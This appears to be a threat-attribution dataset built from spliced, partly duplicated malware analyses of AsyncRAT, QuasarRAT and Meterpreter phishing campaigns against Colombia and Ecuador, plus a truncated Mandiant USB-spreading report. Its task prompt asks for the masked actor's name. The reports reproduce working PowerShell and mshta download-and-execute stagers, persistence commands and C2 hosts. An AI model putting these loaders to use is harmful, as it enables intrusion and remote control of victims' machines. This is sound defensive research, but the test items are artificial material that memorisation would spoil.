6D9D0EB5E8E69FFE9914C63676D293DA1B7D3B7B9F3D2C8035ABE0A3DE8B9FCA    File Name    Asuntos_DIAN_N6440005403992837L2088970004-01-02-2023-pdf.uue    File Size    1941 (bytes)      It’s necessary to decompress the contents of the .uue file to continue with the infection chain. The compressed .uue file contains yet another file inside it. The inner file uses the same naming convention as the parent, but in this case, the new file is a Visual Basic Script (VBS).      Figure 6: Content of the malicious .uue file      Hashes (md5, sha-256)    6BEF68F58AFCFDD93943AFCC894F8740    430BE2A37BAC2173CF47CA1376126A3E78A94904DBC5F304576D87F5A17ED366    File name    Asuntos_DIAN_N°6440005403992837L2088970004-01-02-2023-pdf.vbs    File Size    227378 (bytes)    Last Modified    2023:01:31 23:01:04      The file-extracted VBS script is executed via wscript.exe once the user double-clicks the file, so an element of user-interaction is involved in executing the attack. Upon execution, the infection chain starts automatically and carries out various actions within the system without any further user input, as seen below in figure 7.      Figure 7: Process tree once the VBS script is manually executed by the user    The VBS script's content is encoded but easy for a researcher to understand and decode.      Figure 8: Content of the VBS script    The VBS script contains a significant amount of junk code, but has several replace functions to construct the PowerShell execution.      Figure 9: Replace functions to replace junk code by the original behavior    The content was built under the variable “OXVTEUOWQPEFWQ”, as shown in figure 9 above. After creating that content, figure 8 shows the variable “YISMXXAPAUXCGFI”, which is set as a WScript object.    After decoding the code, to better understand its behavior, we can see that a part of the logic - the URL shown in the above image - is actually reversed.      Figure 10: Part of the VBS code decoded       Figure 11: A closer look at part of the VBS code, decoded    The final payload executed is powershell.exe, with the following command line parameters:    "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" [Byte[]] $rOWg = [system.Convert]::FromBase64string((New-Object Net.WebClient).DownloadString('hxxp://172.174.176[.]153/dll/Dll.ppam'));[System.AppDomain]::CurrentDomain.Load($rOWg).GetType('Fiber.Home').GetMethod('VAI').Invoke($null, [object[]] ('txt.ysa/3383903646370010701/3046420575525667501/stnemhcatta/moc.ppadrocsid.ndc//:sptth'))  First, PowerShell downloads and executes the decoded base64 content of hxxp://172.174.176[.]153/dll/Dll.ppam, which is a .NET DLL encoded, as shown in figure 12.    Figure 12: Base64 content from the server, called using powershell.exe    Next, it uses GetType(‘Fiber.home’).GetMethod(‘VAI’), to load the VAI method from the DLL downloaded previously. The logic of this method is as follows:    To create a copy of the Visual Basic Script called “Asuntos_DIAN_N°6440005403992837L2088970004-01-02-2023-pdf.vbs” in C:\Windows\Temp\OneDrive.vbs if it already doesn’t exist using PowerShell.  Powershell.exe -WindowStyle Hidden Copy-Item -Path *.vbs -Destination C:\Windows\Temp\OneDrive.vbs  Download the content of hxxp://172.174.176[.]153/rump/Rump.xls (Fsociety)  Replace characters of the content downloaded  Reverse the text of the second URL in the PowerShell command and download its content (hxxps://cdn.discordapp[.]com/attachments/1057665255750246403/1070100736463093833/asy[.]txt (AsyncRAT payload)  Create a string with the content “C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe”  Load the Fsociety DLL into memory, passing two parameters:  RegSvcs path  AsyncRAT payload  Fsociety DLL loads AsyncRAT in the RegSvcs process using the Process Hollowing technique  To better understand the PowerShell execution, the following image demonstrates the sequence of loading DLLs dynamically in memory until the final goal, which is to load AsyncRAT into memory. AsyncRAT is one of the most popular open-source remote access Trojans (RATs) on the threat landscape today.      Figure 13: Sequence of loaded DLLs after PowerShell execution    The following image is part of all the behavior described above, related to the first DLL loaded using the PowerShell command spawned by the VBS Script and calling the ‘VAI’ method.      Figure 14: Part of the method VAI previously called by PowerShell    As mentioned, Fsociety.dll is used to load the final payload of AsyncRAT, which is downloaded from Discord.    [PLACEHOLDER] mainly uses AsyncRAT, njRAT, QuasarRAT, LimeRAT, and RemcosRAT in its campaigns. A RAT is a remote access tool a network admin may use to remotely administrate the node. So a malicious RAT installed on a victim’s machine enables the threat actor to connect to the infected endpoint any time they like, and to perform any operations they desire.      Figure 15: Fsociety.dll is used to load AsyncRAT in memory    The “Ande” function called in the Fsociety.dll contains the following code:      Figure 16: Fsociety DLL code       Hashes (md5, sha-256)    C75F9D3DA98E57B973077FDE8EC3780F    5399BF1F18AFCC125007D127493082005421C5DDEBC34697313D62D8BC88DAEC    File Name    Fiber.dll (Dll.ppam)    File Size    10240 bytes    Compiled    Thu Feb 02 21:43:24 2023 | UTC         Hashes (md5, sha-256)    07AF8778DE9F2BC53899AAC7AD671A72    03B7D19202F596FE4DC556B7DA818F0F76195912E29D728B14863DDA7B91D9B5    File Name    Fsociety.dll (Rump.xls)    File Size    25600 bytes    Compiled    Sat May 18 00:13:09 2086 | UTC              Hashes (md5, sha-256)    5E518B80C701E17259F3E7323EFFC83F    64A08714BD5D04DA6E2476A46EA620E3F7D2C8A438EDA8110C3F1917D63DFCFC    File Name    Stub.exe (AsyncRAT payload)    File Size    26080 bytes    Compiled    Sun May 10 05:24:51 2020 | UTC      AsyncRAT contains a configuration method with information that is used during the intrusion attempt. This information is encrypted using Base64 and AES256.      Figure 17: AsyncRAT configuration encrypted    Once the configuration is decrypted, it contains information about the Command-and-Control (C2) to transfer commands and files between client and server.      Figure 18: AsyncRAT configuration decrypted    Also, between the configuration, it was possible to obtain the X.509 certificates used for communication with the C2.      Figure 19: Certificate extracted from the AsyncRAT config    AsyncRAT can establish persistence in two different ways, depending on whether a user loaded it with admin privileges or not. A copy of itself is first created under C:\Users\<user>\AppData\Roaming\MRR.exe.      Figure 20: Creation of MRR in AppData folder    1.      If the user who executed it was an admin, then AsyncRAT can create a scheduled task using the process schtasks.exe, with the following command line:    a.      "C:\Windows\System32\cmd.exe" /c schtasks /create /f /sc onlogon /rl highest /tn "MRR" /tr '"C:\Users\<user>\AppData\Roaming\MRR.exe"' & exit'      Figure 21: Execution of schtasks.exe via cmd.exe       Figure 22: Command line executed to create scheduled task and run AsyncRAT    2.      If the user is not an admin, then AsyncRAT can create a registry key to execute the binary every time the system is started:    a.      Key: KCU\Software\Microsoft\Windows\CurrentVersion\Run\MRR  b.      Value: C:\Users\<user>\AppData\Roaming\MRR.exe      Figure 23: Registry key created to execute the AsyncRAT Payload    An interesting part that always happens, regardless of whether the user is admin or not, is the creation of a .bat file in the user’s Temp directory to perform the following actions:    a.      Timeout.exe execution for three seconds  b.      Run the AsyncRAT payload from AppData folder  c.       Delete the .bat file      Figure 24: tmp file creation in the Temp directory      Figure 25: Execution of cmd.exe to load the .bat file from tmp folder    We could determine that the .bat filename is randomly generated using the regular expression after several executions of this sample. The structure is like the next one: .*tmp[a-zA-Z1-9]{4}.tmp.bat.      Figure 26: Persistence methods used by AsyncRAT    Network Infrastructure  In this case, the victim’s machine starts communicating with the DuckDNS server to receive and execute commands, exfiltrate information, and perform any other action desired by the threat actor. As seen in figure 18 above, the server used is asy1543.duckdns[.]org:1543.      Figure 27: Communication started between victim’s machine and the threat actor’s C2    During our investigation, the resolution of the DuckDNS domain was changed to different IP addresses. Initially, the IP that resolves the domain was a VPN/Proxy service 46.246.86[.]3. While conducting the investigation, we discovered another IP with the same purpose, 46.246.12[.]6.    Entity    Value    Description    Domain    asy1543.duckdns[.]org:1543    Final AsyncRAT payload communication domain    IP    46.246.86[.]3    Resolution of the DuckDNS domain    IP    46.246.12[.]6    Resolution of the DuckDNS domain    URL    hxxp://172.174.176[.]153/    Web application hosting payloads used during the infection    IP    172.174.176[.]153    IP of the web application hosting payloads used during the infection      [PLACEHOLDER]/ [PLACEHOLDER] uses Dynamic DNS (DDNS) services, such as DuckDNS, for most campaigns to connect its implemented RATs to the infrastructure they control to send and receive commands. DuckDNS additionally allows for high IP resolution rotation and the launch of new subdomains under this well-known DDNS    The application web hosted under hxxp://172.174.176[.]153/ had two main directories where it stored information to be used during the intrusion as the user downloads and executes files.    The first directory was hxxp://172.174.176[.]153/dll/, storing several DLLs used during the intrusion.      Figure 28: Index of [PLACEHOLDER]'s /dll directory    Another directory is found at hxxp://172.174.176[.]153/rump/ and stores another DLL, in this case, related to Fsociety:      Figure 29: index of /rump directory    Targets  [PLACEHOLDER]/ [PLACEHOLDER]'s targets include health, public, financial, judiciary, and law enforcement entities in Colombia.    Among the countries where we have seen [PLACEHOLDER] activity in the last few months, specifically distributing the UUE file types with different themes, include:    Colombia  Ecuador  Chile  Spain  This is consistent with the use of the Spanish language in the group’s spear-phishing emails. Most countries in South America use Spanish (apart from Brazil), which matches the threat actor’s locale and the names in the bait document.    Attribution  [PLACEHOLDER] is a South American-based threat actor active since at least 2019. The group continues to concentrate its operations within a Hispanic geographic region, with its main targets being government institutions and other organizations primarily based in Colombia.    The use of specific tools and artifacts, along with the type and configuration of the network infrastructure documented in this report, combined with the tactics, techniques & procedures (TTPs) used to deploy them, all closely align with previously attributed campaigns by this group.    That, coupled with the geolocation and nature of the targets seen in this campaign, leads us to ascertain, at the very least, a moderate level of confidence that this campaign was conducted by [PLACEHOLDER].    Conclusions  This campaign continues to operate for the purposes of information theft and espionage. The modus operandi used has mostly stayed the same as the group’s previous efforts – it is very simple, which may mean that this group is comfortable with its way of launching campaigns via phishing emails, and feels confident in using them because they continue to work.    Over the next few months, we will likely continue to see new targets for this group, using new ways to deceive their victims.
https://research.checkpoint.com/2023/blindeagle-targeting-ecuador-with-sharpened-tools/	ACTIVE CAMPAIGNS AGAINST COLOMBIAN TARGETS  For the last few months, we have been observing the ongoing campaigns orchestrated by [PLACEHOLDER], which have mostly adhered to the TTPs described above — phishing emails pretending to be from the Colombian government. One typical example is an email purportedly from the Ministry of Foreign Affairs, threatening the recipient with issues when leaving the country unless they settle a bureaucratic matter.    Such emails usually feature either a malicious document or a malicious link, but in this case, the attackers said “why not both?” and included both a link and a terse attached PDF directing the unfortunate victim to the exact same link.      In both cases, the link in question consists of a legitimate link-shortening service URL that geolocates victims and makes them communicate with a different “server” depending on the original country (https://gtly[.]to/QvlFV_zgh). If the incoming HTTP request originates from outside Colombia, the server aborts the infection chain, acts innocent and redirects the client to the official website of the migration department of the Colombian Ministry of Foreign Affairs.      If the incoming request seems to arrive from Colombia, the infection chain proceeds as scheduled. The server responds to the client with a file for download. This is a malware executable hosted on the file-sharing service MediaFire. The file is compressed, similar to a ZIP file, using the LHA algorithm. It is password-protected, making it impervious against naive static analysis and even naive sandbox emulation. The password is found both in the email and in the attached PDF.      The malicious executable inside the LHA is written in .Net and packed. When unpacked, a modified sample of QuasarRAT is revealed.    QuasarRAT is an open source trojan available in multiple sources like Github. The (probably Spanish-speaking) actors behind this APT group have added some extra capabilities over the last few years, which are easy to spot due to the names of functions and variables in Spanish. This process, by which threat actors abuse access to malware sources and each create their own special versions of that malware, is sadly not without precedent in the security landscape and always makes us heave a sad sigh when we encounter it.    Although QuasarRAT is not a dedicated banking Trojan, it can be observed from the sample’s embedded strings that the group’s main goal in the campaign was to intercept victim access to their bank account.      This is a complete list of targeted entities:    Bancolombia Sucursal Virtual Personas  Sucursal_Virtual_Empresas_  Portal Empresarial Davivienda  BBVA Net Cash  Colpatria – Banca Empresas  bancaempresas.bancocajasocial.com  Empresarial Banco de Bogota  conexionenlinea.bancodebogota.com  AV Villas – Banca Empresarial  Bancoomeva Banca Empresarial  TRANSUNION  Banco Popular  portalpymes  Blockchain  DashboardDavivienda  Some extra features added to Quasar by this group are a function named “ActivarRDP” (activate RDP) and two more to activate and deactivate the system Proxy:      Along with a few more commands that incur technical debt by impudently disregarding Quasar’s convention for function name and parameter order:      A BETTER CAMPAIGN FEATURING NEWER TOOLS  One specific sample caught our attention as it was related to a government institution from Ecuador and not from Colombia. While [PLACEHOLDER] attacking Ecuador is not unprecedented, it is still unusual. Similarly to the campaign described above, the geo-filter server in this campaign redirects requests outside of Ecuador and Colombia to the website of the Ecuadorian Internal Revenue Service:        If contacted from Colombia or Ecuador, the downloaded file from Mediafire will be a RAR archive with a password. But instead of a single executable consisting of some packed RAT, the infection chain, in this case, is much more elaborate:      Inside the RAR archive, there is an executable built with PyInstaller with a rather simplistic Python 3.10 code. This code just adds a new stage in the infection chain:    import os  import subprocess  import ctypes  ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)  wsx = 'mshta <https://gtly> [.] to/dGBeBqd8z'  os.system(wsx)  mshta is a utility that executes Microsoft HTML Applications, and the attackers abuse it here to download and execute the next stage, which contains VBS code embedded in an HTML.    <script language="VBScript">   CreateObject("Wscript.Shell").run"powershell.exe -noexit ""$a1='IEX ((new-object net.webclient).downl';$a2='oadstring(''https://[malicious domain]/wins''))';$a3=""$a1,$a2"";IEX(-join $a3)""", 0, true  self.close  </script>  Usually campaigns by [PLACEHOLDER] abuse legitimate file sharing services such as Mediafire or free dynamic domains like “*.linkpc.net”; this case is different, and the next stage is hosted at the malicious domain upxsystems[.]com.    This next-stage downloads and executes yet another next-stage, a script written in Powershell:    function StartA{  [version]$OSVersion = [Environment]::OSVersion.Version  If ($OSVersion -gt "10.0") {      iex (new-object net.webclient).downloadstring("https://[malicious domain]/covidV22/ini/w10/0")  } ElseIf ($OSVersion -gt "6.3") {      iex (new-object net.webclient).downloadstring("https://[malicious domain]/covidV22/ini/w8/0")  } ElseIf ($OSVersion -gt "6.2") {      iex (new-object net.webclient).downloadstring("https://[malicious domain]/covidV22/ini/w8/0")  } ElseIf ($OSVersion -gt "6.1") {      iex (new-object net.webclient).downloadstring("http://[malicious domain]/covidV22/ini/w7/0")  }  }  StartA  The above Powershell checks the system version and downloads the appropriate additional Powershell. This additional OS-specific Powershell checks for installed AV tools and behaves differently based on its findings.    The main difference between each next stage consists in different pieces of code that will try to disable the security solution (for example Windows Defender), but in all cases, regardless of the type of security solution installed on the computer, the next stagewill download a version of python suitable for the target OS and install it:    Function PY(){          if([System.IntPtr]::Size -eq 4)          {          $progressPreference = 'silentlyContinue'          $url = "<https://www.python.org/ftp/python/3.9.9/python-3.9.9-embed-win32.zip>"          $output = "$env:PUBLIC\\py.zip"          $start_time = Get-Date          $wc = New-Object System.Net.WebClient          $wc.DownloadFile($url, $output)          New-Item "$env:PUBLIC\\py" -type directory          $FILE=Get-Item "$env:PUBLIC\\py" -Force          $FILE.attributes='Hidden'          $shell = New-Object -ComObject Shell.Application          $zip = $shell.Namespace("$env:PUBLIC\\py.zip")          $items = $zip.items()          $shell.Namespace("$env:PUBLIC\\py").CopyHere($items, 1556)          start-sleep -Seconds 2;          Remove-Item "$env:PUBLIC\\py.zip"          Remove-Item "$env:USERPROFILE\\PUBLIC\\Local\\Microsoft\\WindowsApps\\*.*" -Recurse -Force          Remove-Item "$env:USERPROFILE\\AppData\\Local\\Microsoft\\WindowsApps\\*.*" -Recurse -Force          setx PATH "$env:path;$env:PUBLIC\\py"          New-Item -Path HKCU:\\Software\\Classes\\Applications\\python.exe\\shell\\open\\command\\ -Value """$env:PUBLIC\\py\\python.exe"" ""%1""" -Force          Set-ItemProperty -path 'hkcu:\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache\\' -name "$env:PUBLIC\\py\\python.exe.ApplicationCompany" -value "Python Software Foundation"          Set-ItemProperty -path 'hkcu:\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache\\' -name "$env:PUBLIC\\py\\python.exe.FriendlyAppName" -value "Python"         }  ....  It will then download two scripts named mp.py and ByAV2.py which will be stored in the user %Public% folder and for which it will create a scheduled task that will run every 10 minutes. For Windows 7 the task will be created by downloading an XML from the C2 “upxsystems[.]com”, while for Windows 8, 8.1, and 10 the malware will create the task using the cmdlet “New-ScheduledTask*”.    In the case of Windows 7, the task is preconfigured to be executed as System and contains the following description    <Description> Mantiene actualizado tu software de Google. Si esta tarea se desactiva o se detiene, tu software de Google no se mantendrá actualizado, lo que implica que las vulnerabilidades de seguridad que puedan aparecer no podrán arreglarse y es posible que algunas funciones no anden. Esta tarea se desinstala automáticamente si ningún software de Google la utiliza. </Description>    It’s written using the kind of Spanish that is commonly spoken in the target countries, which can be noticed for example with the use of “es posible que algunas funciones no anden” instead of “no se ejecuten” or any other variation more common in different geographic regions.    The full description can be translated to:    “Keeps your Google software up to date. If this task is disabled or stopped, your Google software will not be kept up to date, which means that security vulnerabilities that may appear cannot be fixed and some features may not work. This task is automatically uninstalled if no Google software uses it.”    After downloading the Python scripts and adding persistence, the malware will try to kill all processes related to the infection.    Regarding the two downloaded scripts, both are obfuscated using homebrew encoding that consists of base64 repeated 5 times (we will never, ever, tire of responding to such design choices with “known to be 5 times as secure as vanilla base64”):      After deciphering these strings for each script we obtain two different types of Meterpreter samples.    ByAV2.py  This code consists of an in-memory loader developed in Python, which will load and run a normal Meterpreter sample in DLL format that uses “tcp://systemwin.linkpc[.]net:443” as a C2 server.    Python has a built-in PRNG, and in principle no one is stopping you from constructing a stream cipher based on it, which is what the malware authors do here. The embedded DLL is decrypted using this makeshift “randint stream cipher” with an embedded key (in this construction the key is used as the seed to prime the random library). In the grand tradition of cryptography used inside of malware purely to obfuscate buffers using a hardcoded key, the question of how secure this makeshift cipher is has exactly zero consequences.      mp.py  The second script basically consists of another sample of Meterpreter — this time a version developed entirely in Python and using the same C2 server. We can only speculate on why the server was configured to drop the same payload with the same C2 server but written in a different language; possibly one of the samples acts as a plan B in case of the other sample gets detected by some antivirus solution and removed.      CONCLUSION  [PLACEHOLDER] is a strange bird among APT groups. Judging by its toolset and usual operations, it is clearly more interested in cybercrime and monetary gain than in espionage; however, unlike most such groups that just attack the entire world indiscriminately, [PLACEHOLDER] has a very narrow geographical focus, most of the time limited to a single country. This latest campaign targeting Ecuador highlights how, over the last few years, [PLACEHOLDER] has matured as a threat — refining their tools, adding features to leaked code bases, and experimenting with elaborate infection chains and “Living off the Land” as seen with the clever abuse of mshta. If what we’ve seen is any indication, this group is worth keeping an eye on so that victims aren’t blindsided by whatever clever thing they try next.    Check Point’s anti-phishing solutions for office 365 & G suite analyzes all historical emails in order to determine prior trust relations between the sender and receiver, increasing the likelihood of identifying user impersonation or fraudulent messages. Artificial Intelligence (AI) and Indicators of Compromise (IoCs) used in the past train the Harmony Email & Office platform for what to look for in complex zero-day phishing attacks.	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: ACTIVE CAMPAIGNS AGAINST COLOMBIAN TARGETS  For the last few months, we have been observing the ongoing campaigns orchestrated by [PLACEHOLDER], which have mostly adhered to the TTPs described above — phishing emails pretending to be from the Colombian government. One typical example is an email purportedly from the Ministry of Foreign Affairs, threatening the recipient with issues when leaving the country unless they settle a bureaucratic matter.    Such emails usually feature either a malicious document or a malicious link, but in this case, the attackers said “why not both?” and included both a link and a terse attached PDF directing the unfortunate victim to the exact same link.      In both cases, the link in question consists of a legitimate link-shortening service URL that geolocates victims and makes them communicate with a different “server” depending on the original country (https://gtly[.]to/QvlFV_zgh). If the incoming HTTP request originates from outside Colombia, the server aborts the infection chain, acts innocent and redirects the client to the official website of the migration department of the Colombian Ministry of Foreign Affairs.      If the incoming request seems to arrive from Colombia, the infection chain proceeds as scheduled. The server responds to the client with a file for download. This is a malware executable hosted on the file-sharing service MediaFire. The file is compressed, similar to a ZIP file, using the LHA algorithm. It is password-protected, making it impervious against naive static analysis and even naive sandbox emulation. The password is found both in the email and in the attached PDF.      The malicious executable inside the LHA is written in .Net and packed. When unpacked, a modified sample of QuasarRAT is revealed.    QuasarRAT is an open source trojan available in multiple sources like Github. The (probably Spanish-speaking) actors behind this APT group have added some extra capabilities over the last few years, which are easy to spot due to the names of functions and variables in Spanish. This process, by which threat actors abuse access to malware sources and each create their own special versions of that malware, is sadly not without precedent in the security landscape and always makes us heave a sad sigh when we encounter it.    Although QuasarRAT is not a dedicated banking Trojan, it can be observed from the sample’s embedded strings that the group’s main goal in the campaign was to intercept victim access to their bank account.      This is a complete list of targeted entities:    Bancolombia Sucursal Virtual Personas  Sucursal_Virtual_Empresas_  Portal Empresarial Davivienda  BBVA Net Cash  Colpatria – Banca Empresas  bancaempresas.bancocajasocial.com  Empresarial Banco de Bogota  conexionenlinea.bancodebogota.com  AV Villas – Banca Empresarial  Bancoomeva Banca Empresarial  TRANSUNION  Banco Popular  portalpymes  Blockchain  DashboardDavivienda  Some extra features added to Quasar by this group are a function named “ActivarRDP” (activate RDP) and two more to activate and deactivate the system Proxy:      Along with a few more commands that incur technical debt by impudently disregarding Quasar’s convention for function name and parameter order:      A BETTER CAMPAIGN FEATURING NEWER TOOLS  One specific sample caught our attention as it was related to a government institution from Ecuador and not from Colombia. While [PLACEHOLDER] attacking Ecuador is not unprecedented, it is still unusual. Similarly to the campaign described above, the geo-filter server in this campaign redirects requests outside of Ecuador and Colombia to the website of the Ecuadorian Internal Revenue Service:        If contacted from Colombia or Ecuador, the downloaded file from Mediafire will be a RAR archive with a password. But instead of a single executable consisting of some packed RAT, the infection chain, in this case, is much more elaborate:      Inside the RAR archive, there is an executable built with PyInstaller with a rather simplistic Python 3.10 code. This code just adds a new stage in the infection chain:    import os  import subprocess  import ctypes  ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)  wsx = 'mshta <https://gtly> [.] to/dGBeBqd8z'  os.system(wsx)  mshta is a utility that executes Microsoft HTML Applications, and the attackers abuse it here to download and execute the next stage, which contains VBS code embedded in an HTML.    <script language="VBScript">   CreateObject("Wscript.Shell").run"powershell.exe -noexit ""$a1='IEX ((new-object net.webclient).downl';$a2='oadstring(''https://[malicious domain]/wins''))';$a3=""$a1,$a2"";IEX(-join $a3)""", 0, true  self.close  </script>  Usually campaigns by [PLACEHOLDER] abuse legitimate file sharing services such as Mediafire or free dynamic domains like “*.linkpc.net”; this case is different, and the next stage is hosted at the malicious domain upxsystems[.]com.    This next-stage downloads and executes yet another next-stage, a script written in Powershell:    function StartA{  [version]$OSVersion = [Environment]::OSVersion.Version  If ($OSVersion -gt "10.0") {      iex (new-object net.webclient).downloadstring("https://[malicious domain]/covidV22/ini/w10/0")  } ElseIf ($OSVersion -gt "6.3") {      iex (new-object net.webclient).downloadstring("https://[malicious domain]/covidV22/ini/w8/0")  } ElseIf ($OSVersion -gt "6.2") {      iex (new-object net.webclient).downloadstring("https://[malicious domain]/covidV22/ini/w8/0")  } ElseIf ($OSVersion -gt "6.1") {      iex (new-object net.webclient).downloadstring("http://[malicious domain]/covidV22/ini/w7/0")  }  }  StartA  The above Powershell checks the system version and downloads the appropriate additional Powershell. This additional OS-specific Powershell checks for installed AV tools and behaves differently based on its findings.    The main difference between each next stage consists in different pieces of code that will try to disable the security solution (for example Windows Defender), but in all cases, regardless of the type of security solution installed on the computer, the next stagewill download a version of python suitable for the target OS and install it:    Function PY(){          if([System.IntPtr]::Size -eq 4)          {          $progressPreference = 'silentlyContinue'          $url = "<https://www.python.org/ftp/python/3.9.9/python-3.9.9-embed-win32.zip>"          $output = "$env:PUBLIC\\py.zip"          $start_time = Get-Date          $wc = New-Object System.Net.WebClient          $wc.DownloadFile($url, $output)          New-Item "$env:PUBLIC\\py" -type directory          $FILE=Get-Item "$env:PUBLIC\\py" -Force          $FILE.attributes='Hidden'          $shell = New-Object -ComObject Shell.Application          $zip = $shell.Namespace("$env:PUBLIC\\py.zip")          $items = $zip.items()          $shell.Namespace("$env:PUBLIC\\py").CopyHere($items, 1556)          start-sleep -Seconds 2;          Remove-Item "$env:PUBLIC\\py.zip"          Remove-Item "$env:USERPROFILE\\PUBLIC\\Local\\Microsoft\\WindowsApps\\*.*" -Recurse -Force          Remove-Item "$env:USERPROFILE\\AppData\\Local\\Microsoft\\WindowsApps\\*.*" -Recurse -Force          setx PATH "$env:path;$env:PUBLIC\\py"          New-Item -Path HKCU:\\Software\\Classes\\Applications\\python.exe\\shell\\open\\command\\ -Value """$env:PUBLIC\\py\\python.exe"" ""%1""" -Force          Set-ItemProperty -path 'hkcu:\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache\\' -name "$env:PUBLIC\\py\\python.exe.ApplicationCompany" -value "Python Software Foundation"          Set-ItemProperty -path 'hkcu:\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache\\' -name "$env:PUBLIC\\py\\python.exe.FriendlyAppName" -value "Python"         }  ....  It will then download two scripts named mp.py and ByAV2.py which will be stored in the user %Public% folder and for which it will create a scheduled task that will run every 10 minutes. For Windows 7 the task will be created by downloading an XML from the C2 “upxsystems[.]com”, while for Windows 8, 8.1, and 10 the malware will create the task using the cmdlet “New-ScheduledTask*”.    In the case of Windows 7, the task is preconfigured to be executed as System and contains the following description    <Description> Mantiene actualizado tu software de Google. Si esta tarea se desactiva o se detiene, tu software de Google no se mantendrá actualizado, lo que implica que las vulnerabilidades de seguridad que puedan aparecer no podrán arreglarse y es posible que algunas funciones no anden. Esta tarea se desinstala automáticamente si ningún software de Google la utiliza. </Description>    It’s written using the kind of Spanish that is commonly spoken in the target countries, which can be noticed for example with the use of “es posible que algunas funciones no anden” instead of “no se ejecuten” or any other variation more common in different geographic regions.    The full description can be translated to:    “Keeps your Google software up to date. If this task is disabled or stopped, your Google software will not be kept up to date, which means that security vulnerabilities that may appear cannot be fixed and some features may not work. This task is automatically uninstalled if no Google software uses it.”    After downloading the Python scripts and adding persistence, the malware will try to kill all processes related to the infection.    Regarding the two downloaded scripts, both are obfuscated using homebrew encoding that consists of base64 repeated 5 times (we will never, ever, tire of responding to such design choices with “known to be 5 times as secure as vanilla base64”):      After deciphering these strings for each script we obtain two different types of Meterpreter samples.    ByAV2.py  This code consists of an in-memory loader developed in Python, which will load and run a normal Meterpreter sample in DLL format that uses “tcp://systemwin.linkpc[.]net:443” as a C2 server.    Python has a built-in PRNG, and in principle no one is stopping you from constructing a stream cipher based on it, which is what the malware authors do here. The embedded DLL is decrypted using this makeshift “randint stream cipher” with an embedded key (in this construction the key is used as the seed to prime the random library). In the grand tradition of cryptography used inside of malware purely to obfuscate buffers using a hardcoded key, the question of how secure this makeshift cipher is has exactly zero consequences.      mp.py  The second script basically consists of another sample of Meterpreter — this time a version developed entirely in Python and using the same C2 server. We can only speculate on why the server was configured to drop the same payload with the same C2 server but written in a different language; possibly one of the samples acts as a plan B in case of the other sample gets detected by some antivirus solution and removed.      CONCLUSION  [PLACEHOLDER] is a strange bird among APT groups. Judging by its toolset and usual operations, it is clearly more interested in cybercrime and monetary gain than in espionage; however, unlike most such groups that just attack the entire world indiscriminately, [PLACEHOLDER] has a very narrow geographical focus, most of the time limited to a single country. This latest campaign targeting Ecuador highlights how, over the last few years, [PLACEHOLDER] has matured as a threat — refining their tools, adding features to leaked code bases, and experimenting with elaborate infection chains and “Living off the Land” as seen with the clever abuse of mshta. If what we’ve seen is any indication, this group is worth keeping an eye on so that victims aren’t blindsided by whatever clever thing they try next.    Check Point’s anti-phishing solutions for office 365 & G suite analyzes all historical emails in order to determine prior trust relations between the sender and receiver, increasing the likelihood of identifying user impersonation or fraudulent messages. Artificial Intelligence (AI) and Indicators of Compromise (IoCs) used in the past train the Harmony Email & Office platform for what to look for in complex zero-day phishing attacks.
https://cloud.google.com/blog/topics/threat-intelligence/turla-galaxy-opportunity/	USB Spreading  As Mandiant recently wrote about in our blog post, Always Another Secret: Lifting the Haze on China-nexus Espionage in Southeast Asia, USB spreading malware continues to be a useful vector to gain initial access into organizations. In this incident, a USB infected with several strains of older malware was inserted at a Ukrainian organization in December 2021. When the system's user double clicked a malicious link file (LNK) disguised as a folder within the USB drive, a legacy [PLACEHOLDER] sample was automatically installed and began to beacon out.    [PLACEHOLDER] or 2013 Wants Its Malware Back  The version of [PLACEHOLDER] that was installed to C:\Temp\TrustedInstaller.exe (MD5: bc76bd7b332aa8f6aedbb8e11b7ba9b6), was first uploaded on 2013-03-19 to VirusTotal and several of the C2 domains had either expired or been sinkholed by researchers. When executed, the [PLACEHOLDER] binary established persistence by dropping another [PLACEHOLDER] sample to C:\ProgramData\Local Settings\Temp\mskmde.com (MD5: b3657bcfe8240bc0985093a0f8682703) and adding a Run Registry Key to execute it every time the system user logged on. One of its C2 domains, “anam0rph[.]su,” which had expired, was found to be newly re-registered on 2022-08-12. UNC4210 used this C2 to profile victims before sending the first stage KOPILUWAK dropper if the victim was deemed interesting.    Mandiant identified several different hosts with beaconing [PLACEHOLDER] stager samples. However, we only observed one case in which [PLACEHOLDER]-related malware was dropped in additional stages, suggesting a high level of specificity in choosing which victims received a follow-on payload. During the time Mandiant monitored the C2s used to deliver the next stage payloads, the servers only remained up for a short period of a few days before going offline for several weeks at a time.    Recon with Ol’ Reliable KOPILUWAK  After several months of [PLACEHOLDER] beaconing without any significant activity observed, UNC4210 downloaded and executed a WinRAR Self-Extracting Archive (WinRAR SFX) containing KOPILUWAK (MD5: 2eb6df8795f513c324746646b594c019) to the victim host on September 6, 2022. Interestingly, the attackers appeared to download and run the same WinRAR SFX dropper containing KOPILUWAK seven times between September 6 and September 8. Each time the KOPILUWAK cast its net, it attempted to transfer significant amounts of data to the C2 manager.surro[.]am. It is unclear why UNC4210 did this as the profiling commands are hard coded in KOPILUWAK and would not yield different sets of data from the same host.    KOPILUWAK is a JavaScript-based reconnaissance utility used to facilitate C2 communications and victim profiling. It was first reported publicly by Kaspersky and has been tracked by Mandiant since 2017. Historically, the utility has been delivered to victims as a first-stage malicious email attachment. This is consistent with [PLACEHOLDER]’s historical reuse of tools and malware ecosystems, including KOPILUWAK, in cyber operations.    The [PLACEHOLDER] injected process “wuauclt.exe” made a GET request to “yelprope.cloudns[.]cl" with the target URL "/system/update/version.” yelprope.cloudns[.]cl is a ClouDNS dynamic DNS subdomain which was previously used by [PLACEHOLDER] and was re-registered by UNC4210. The 